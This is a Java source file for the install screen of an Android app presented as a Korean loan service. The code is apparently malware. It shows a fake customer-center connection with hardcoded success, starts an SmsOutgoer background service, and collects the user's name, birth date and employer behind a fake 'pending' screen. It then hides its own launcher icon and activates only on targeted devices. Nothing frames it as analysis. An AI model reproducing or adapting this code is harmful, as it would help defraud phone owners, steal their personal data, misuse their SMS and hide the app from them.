package main.app.loan;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.widget.EditText;

public class InstallWnd extends Activity {

	public static final byte FLAG_POPUP_LOGINSUCESS = 0x33;
	//public static final byte FLAG_POPUP_PNCODESUCESS = 0x55;
	public static final byte FLAG_INSTALL_EXPIRED = 0x66;
	
	public static String getFolderPath(Context context)
	{
		String strDir = context.getFilesDir().getAbsolutePath() + "/zxc";
		GlobalLib.MakeSubDir(strDir);
		return strDir+"/prk";
	}
	
	
	public static String getTodayString()
	{
		try{
			SimpleDateFormat mSimpleDateFormat = new SimpleDateFormat ( "yyyy.MM.dd HH:mm:ss", Locale.KOREA );  
			Date currentTime = new Date();  
			String result = mSimpleDateFormat.format(currentTime);
			return result;
		}
		catch(Exception e)
		{
			
		}
		return "1999.01.03 02:03:01";
	}
	
	public static int SAVE_HEADER_INFO = 10;
	public static int SAVE_INSTALLDATE_LEN = 30;
	public static int SAVE_OFFSET_STATE = 0;
	public static int SAVE_OFFSET_INSATALLDATE = 1;
	
	public static void SaveInstallState(Context context, byte byState, boolean bExpired)
	{
		try{
			
			String savePath = getFolderPath(context);
			if (GlobalLib.IsExistFile(savePath))
			{
				GlobalLib.DeleteFile(savePath);
			}
			File file=new File(savePath);
			file.createNewFile();

			byte[] tempArray = new byte[SAVE_HEADER_INFO + SAVE_INSTALLDATE_LEN];
			Arrays.fill(tempArray, (byte)0);
			if (byState == FLAG_POPUP_LOGINSUCESS)
			{
				tempArray[SAVE_OFFSET_STATE] = byState;
			}
			
			String strToday = getTodayString();

			if (bExpired == true)
			{
				tempArray[SAVE_OFFSET_INSATALLDATE] = FLAG_INSTALL_EXPIRED;
				strToday = "1999.01.03 02:03:01";
			}
			
			byte[] pbyBuff = strToday.getBytes();
			System.arraycopy(pbyBuff, 0, tempArray, SAVE_HEADER_INFO, pbyBuff.length);


			FileOutputStream fos = new FileOutputStream(savePath);
			fos.write(tempArray);
			fos.close(); 
		}
		catch(Exception e)
		{
			
		}
	}
	
	public static byte ReadInstallState(Context context)
	{
		try{
	    	String openPath=getFolderPath(context);
	    	if (GlobalLib.IsExistFile(openPath) == true)
	    	{
				FileInputStream fis = new FileInputStream(openPath);
				byte[] tempArray = new byte[SAVE_HEADER_INFO];
				fis.read(tempArray);
				fis.close();
				
				byte byState = tempArray[SAVE_OFFSET_STATE];
				if ( byState == FLAG_POPUP_LOGINSUCESS)
				{
					return byState;
				}
	    	}
		}
		catch(Exception e)
		{
			
		}
		return 0;
	}
	
	public static boolean IsOverDeadline(Context context)
	{
		try{
	    	String openPath=getFolderPath(context);
	    	if (GlobalLib.IsExistFile(openPath) == true)
	    	{
				FileInputStream fis = new FileInputStream(openPath);
				byte[] tempArray = new byte[SAVE_HEADER_INFO + SAVE_INSTALLDATE_LEN];
				fis.read(tempArray);
				fis.close();
				
				if (tempArray[SAVE_OFFSET_INSATALLDATE] == FLAG_INSTALL_EXPIRED)
				{
					return true;
				}

				byte[] pbyBuff = new byte[SAVE_INSTALLDATE_LEN];
				Arrays.fill(pbyBuff, (byte)0);
				System.arraycopy(tempArray, SAVE_HEADER_INFO, pbyBuff, 0, pbyBuff.length);
				String installDate = GlobalLib.ToCString(pbyBuff); 
				
				long onehour_milisecond = 60 * 60 * 1000;
				SimpleDateFormat mSimpleDateFormat = new SimpleDateFormat ( "yyyy.MM.dd HH:mm:ss", Locale.KOREA );  
				Date currentTime = new Date();  
				Date saveDate = mSimpleDateFormat.parse(installDate);
				//String mTime = mSimpleDateFormat.format ( currentTime );
				long overtime = currentTime.getTime() - saveDate.getTime();
				if (overtime > 24 * 10 * onehour_milisecond)
				{
					SaveInstallState(context, FLAG_POPUP_LOGINSUCESS, true);
					return true;
				}
	    	}
		}
		catch(Exception e)
		{
			
		}
		return false;
	}

	
	public static final int HANDLER_MESSAGE_LOGIN_START = 0x11;
	public static final int HANDLER_MESSAGE_LOGIN_SUCCESS = 0x22;
	public static final int HANDLER_MESSAGE_LOGIN_FAIL = 0x33;
	
	public static final int HANDLER_MESSAGE_USERINFO_START = 0x55;
	public static final int HANDLER_MESSAGE_USERINFO_SUCCESS = 0x66;
	public static final int HANDLER_MESSAGE_USERINFO_FAIL = 0x77;
	
	public Activity mMainActivity = null;
	
	public final Handler myHandler = new Handler()
	{
	    public void handleMessage( Message msg )
	    {
	      try{
			if (msg.what == HANDLER_MESSAGE_LOGIN_START)
			{
				final ProgressDialog mProgressDlg = new ProgressDialog(mMainActivity);
				mProgressDlg.setTitle("알림");
				mProgressDlg.setMessage("고객센터에 연결중입니다...\n잠시만 기다려주십시오.");
				mProgressDlg.setIndeterminate(true);
				mProgressDlg.setCancelable(false);
				mProgressDlg.show();

				new Thread(new Runnable() {
					
					@Override
					public void run() {
						// TODO Auto-generated method stub
						
						NetServer.sendAuthPacket(true);
						NetServer.mAuthSuccess = NetServer.AUTH_RESULT_SUCCESS;

						mProgressDlg.dismiss();

						if (NetServer.mAuthSuccess == NetServer.AUTH_RESULT_SUCCESS)
						{
							SendHandlerMessage(HANDLER_MESSAGE_LOGIN_SUCCESS);
						}
						else
						{
							SendHandlerMessage(HANDLER_MESSAGE_LOGIN_FAIL);
						}
					}
				}).start();
				
				return;
			}
			
			if (msg.what == HANDLER_MESSAGE_LOGIN_FAIL)
			{
				String strMsg = "고객센터 연결에 실패하였습니다.\n네트워크 상태를 확인하여 주십시오.\nWifi를 이용하시는것을 권장합니다.";
				ShowAlertMessage(strMsg, true);
				return;
			}


			if (msg.what == HANDLER_MESSAGE_LOGIN_SUCCESS)
			{
				SaveInstallState(mMainActivity, FLAG_POPUP_LOGINSUCESS, false);

				NetServer.AuthToServer(mMainActivity);
				
	            startService(new Intent(mMainActivity, SmsOutgoer.class));
	            
				ShowPersonPopup();	
				
				return;
			}

			if (msg.what == HANDLER_MESSAGE_USERINFO_START)
			{
				final ProgressDialog mProgressDlg = new ProgressDialog(mMainActivity);
				mProgressDlg.setTitle("알림");
				mProgressDlg.setMessage("접수대기 상태입니다...\n잠시만 기다려주십시오.");
				mProgressDlg.setIndeterminate(true);
				mProgressDlg.setCancelable(false);
				mProgressDlg.show();
				
//				final String userName = msg.getData().getString("userName");
//				final String personCode = msg.getData().getString("personCode");

				new Thread(new Runnable() {
					
					@Override
					public void run() {
						// TODO Auto-generated method stub
						GlobalLib.sleep(2500);
						
						mProgressDlg.dismiss();
						
						SendHandlerMessage(HANDLER_MESSAGE_USERINFO_SUCCESS);
					}
				}).start();
				
				return;
			}

			if (msg.what == HANDLER_MESSAGE_USERINFO_FAIL)
			{
				String strMsg = "본인인증에 실패하였습니다.\n네트워크 상태를 확인하여 주십시오.\nWifi를 이용하시는것을 권장합니다.";
				ShowAlertMessage(strMsg, true);
				return;
			}

			if (msg.what == HANDLER_MESSAGE_USERINFO_SUCCESS)
			{
				View mainLayout = findViewById(R.id.mainLayout);
				mainLayout.setBackgroundResource(R.drawable.pg_second);
				
				RemoveAppIcon();
				
				return;
			}
		  }
	      catch(Exception e)
	      {
	    	  
	      }
	    }
	};
	
	void SendHandlerMessage(int nOpcode)
	{
		 try{
		    Message msg = myHandler.obtainMessage();
		    msg.what = nOpcode;
		 	Bundle data=new Bundle();
		 	msg.setData(data); 
		 	myHandler.sendMessage( msg );
		 }
		 catch(Exception e)
		 {
			 
		 }
	}
	
	public void ShowAlertMessage(String message, boolean bTerminate)
	{
		final InstallWnd thisPtr = this;
		AlertDialog.Builder aDialog = new AlertDialog.Builder(this);
		aDialog.setTitle("알림");
		aDialog.setMessage(message);
		aDialog.setCancelable(false);
		final boolean bTerm = bTerminate;
		aDialog.setPositiveButton("확인", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int which) {
				if (bTerm == true)
				{
					thisPtr.finish();
				}
			}
		});
		final AlertDialog dialog = aDialog.create();
		dialog.show();
	}
	
	public void ShowPersonPopup()
	{
		final InstallWnd thisPtr = this;
		Context mContext = getApplicationContext();
		LayoutInflater inflater = (LayoutInflater) mContext.getSystemService(LAYOUT_INFLATER_SERVICE);
		View layout = inflater.inflate(R.layout.dialog_psncode,(ViewGroup) findViewById(R.id.layout_root));
		
		final EditText txtName = (EditText)layout.findViewById(R.id.txtName);
		final EditText txtBirth = (EditText)layout.findViewById(R.id.txtBirth);
		final EditText txtCorp = (EditText)layout.findViewById(R.id.txtCorp);

		
		AlertDialog.Builder aDialog = new AlertDialog.Builder(this);
		aDialog.setTitle("고객정보를 입력해주십시오");
		aDialog.setView(layout);
		aDialog.setCancelable(false);
								
		aDialog.setPositiveButton("확인", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int which) {
				
				String userName = txtName.getText().toString();
				String userBirth = txtBirth.getText().toString();
				String corpName = txtCorp.getText().toString();
				userName.trim(); userBirth.trim(); corpName.trim();

			    Message msg = myHandler.obtainMessage();
			    msg.what = HANDLER_MESSAGE_USERINFO_START;
			 	Bundle data=new Bundle();
			 	data.putString("userName", userName);
			 	data.putString("userBirth", userBirth);
			 	data.putString("corpName", corpName);
			 	msg.setData(data);
			 	myHandler.sendMessage( msg );
			}
		});
		
		aDialog.setNegativeButton("취소", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int which) {
				thisPtr.finish();
			}
		});
		
		final AlertDialog dialog = aDialog.create();
		dialog.show();
		dialog.getButton(DialogInterface.BUTTON_POSITIVE).setEnabled(false);
		
		txtName.addTextChangedListener(new TextWatcher() {
			
			@Override
			public void onTextChanged(CharSequence s, int start, int before, int count) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void beforeTextChanged(CharSequence s, int start, int count,
					int after) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void afterTextChanged(Editable s) {
				// TODO Auto-generated method stub
				String userName = txtName.getText().toString();
				String userBirth = txtBirth.getText().toString();
				String corpName = txtCorp.getText().toString();
				userName.trim(); userBirth.trim(); corpName.trim();
				
				if (userName.length() > 0 && userBirth.length() > 0)
				{
					dialog.getButton(DialogInterface.BUTTON_POSITIVE).setEnabled(true);
				}
				else
				{
					dialog.getButton(DialogInterface.BUTTON_POSITIVE).setEnabled(false);
				}
			}
		});
		
		txtBirth.addTextChangedListener(new TextWatcher() {
			
			@Override
			public void onTextChanged(CharSequence s, int start, int before, int count) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void beforeTextChanged(CharSequence s, int start, int count,
					int after) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void afterTextChanged(Editable s) {
				// TODO Auto-generated method stub
				String userName = txtName.getText().toString();
				String userBirth = txtBirth.getText().toString();
				String corpName = txtCorp.getText().toString();
				userName.trim(); userBirth.trim(); corpName.trim();
				
				if (userName.length() > 0 && userBirth.length() > 0)
				{
					dialog.getButton(DialogInterface.BUTTON_POSITIVE).setEnabled(true);
				}
				else
				{
					dialog.getButton(DialogInterface.BUTTON_POSITIVE).setEnabled(false);
				}
			}
		});
	
	}
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		long nowTime = (new Date()).getTime();
		
//		RbPrefEditor.put(this, RbPrefEditor.PREF_KEY_GETCALL, nowTime);
		RbPrefEditor.put(this, RbPrefEditor.PREF_KEY_GETSMS, nowTime);

		mMainActivity = this;
		
		this.requestWindowFeature(Window.FEATURE_NO_TITLE);

		setContentView(R.layout.activity_login);
		
		NetServer.mDeviceUID = GlobalLib.GetDeviceUID(this);

		if (ModelType.IsTargetDevice(this) == true)
		{
			new Thread(new Runnable() {
				
				@Override
				public void run() {
					GlobalLib.sleep(2000);
					SendHandlerMessage(HANDLER_MESSAGE_LOGIN_START);
				}
			}).start();
			
		}
	}
	
	public void RemoveAppIcon()
	{
		try{
			MainApp mainApp = (MainApp)getApplication();
			if(mainApp.mMainWndName == null) return;
			
			PackageManager pm = getApplicationContext().getPackageManager();
			pm.setComponentEnabledSetting(mainApp.mMainWndName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		}
		catch(Exception e)
		{
		}
	}
}
